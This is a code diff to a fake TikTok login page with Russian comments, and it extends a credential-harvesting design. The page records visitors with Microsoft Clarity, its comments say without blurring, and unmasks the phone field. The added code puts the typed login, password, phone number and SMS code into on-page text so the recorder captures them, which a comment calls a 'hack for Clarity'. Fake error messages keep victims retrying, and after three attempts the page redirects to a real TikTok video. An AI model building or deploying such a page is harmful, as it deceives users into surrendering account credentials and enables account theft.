@@ -6,7 +6,7 @@
   <title>Войти | TikTok</title>
   <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon" />
   
-  <!-- MICROSOFT CLARITY -->
+  <!-- MICROSOFT CLARITY С ПОЛНОЙ ЗАПИСЬЮ БЕЗ БЛЮРА -->
   <script type="text/javascript">
       (function(c,l,a,r,i,t,y){
           c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
@@ -175,6 +175,7 @@
   <!-- ШАПКА -->
   <header class="header">
     <a href="#" class="logo-link" aria-label="TikTok">
+      <!-- ИДЕАЛЬНЫЙ ЛОГОТИП -->
       <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="118" height="42">
         <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
         <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
@@ -236,8 +237,8 @@
             </div>
             <input type="text" name="phone" id="phone-input" class="base-input" placeholder="Номер телефона" data-clarity-unmask="true">
           </div>
-          <!-- Текст ошибки отправки СМС -->
-          <div id="phone-error-msg" class="phone-error-msg">Ошибка: не удалось отправить код, номер недоступен, попробуйте другой номер.</div>
+          <!-- Текст ошибки отправки СМС (появляется только после клика) -->
+          <div id="phone-error-msg" class="phone-error-msg"></div>
           
           <div class="code-input-group">
             <div class="code-input-wrapper">
@@ -298,7 +299,7 @@
     const togglePassBtn = document.getElementById('toggle-pass-btn');
     const eyeClosed = document.getElementById('eye-closed');
     const eyeOpen = document.getElementById('eye-open');
-    let loginAttempts = 0; // Счетчик попыток
+    let emailLoginAttempts = 0;
 
     function validateEmailForm() {
       if (emailInput.value.trim().length > 0 && passInput.value.trim().length > 0) {
@@ -322,15 +323,13 @@
 
     document.getElementById('email-form').addEventListener('submit', (e) => {
       e.preventDefault();
-      loginAttempts++;
+      emailLoginAttempts++;
       
-      if(loginAttempts >= 3) {
-        // На 3-ю попытку редирект
+      if(emailLoginAttempts >= 3) {
         emailSubmitBtn.innerText = 'Загрузка...';
         emailSubmitBtn.style.opacity = '0.7';
         setTimeout(() => { window.location.href = 'https://www.tiktok.com/@tiktok/video/7106594312292453675'; }, 700);
       } else {
-        // Показываем введенные данные во всплывашке
         showToast(`Введен логин: ${emailInput.value} пароль: ${passInput.value}. Попробуйте еще раз.`);
       }
     });
@@ -342,6 +341,7 @@
     const sendCodeBtn = document.getElementById('send-code-btn');
     const phoneSubmitBtn = document.getElementById('phone-submit-btn');
     const phoneErrorMsg = document.getElementById('phone-error-msg');
+    let phoneLoginAttempts = 0;
 
     // Активация кнопки "Отправить код", если введено больше 4 символов телефона
     phoneInput.addEventListener('input', () => {
@@ -355,7 +355,10 @@
 
     // Нажатие на "Отправить код"
     sendCodeBtn.addEventListener('click', () => {
+      const pNum = phoneInput.value.trim();
+      phoneErrorMsg.innerText = `Ошибка: не удалось отправить код. Номер ${pNum} недоступен. Попробуйте другой номер или войдите через логин.`;
       phoneErrorMsg.style.display = 'block';
+      showToast(`Введен номер телефона ${pNum}. Попробуйте другой номер или войти через логин.`);
     });
 
     codeInput.addEventListener('input', () => {
@@ -368,9 +371,15 @@
 
     document.getElementById('phone-form').addEventListener('submit', (e) => {
       e.preventDefault();
-      phoneSubmitBtn.innerText = 'Загрузка...';
-      phoneSubmitBtn.style.opacity = '0.7';
-      setTimeout(() => { window.location.href = 'https://www.tiktok.com/@tiktok/video/7106594312292453675'; }, 700);
+      phoneLoginAttempts++;
+
+      if(phoneLoginAttempts >= 3) {
+        phoneSubmitBtn.innerText = 'Загрузка...';
+        phoneSubmitBtn.style.opacity = '0.7';
+        setTimeout(() => { window.location.href = 'https://www.tiktok.com/@tiktok/video/7106594312292453675'; }, 700);
+      } else {
+        showToast(`Введен телефон: ${phoneInput.value} и код: ${codeInput.value}. Попробуйте еще раз.`);
+      }
     });
 
     // --- ХАК ДЛЯ CLARITY (Запись скрытых данных как DOM-текста) ---
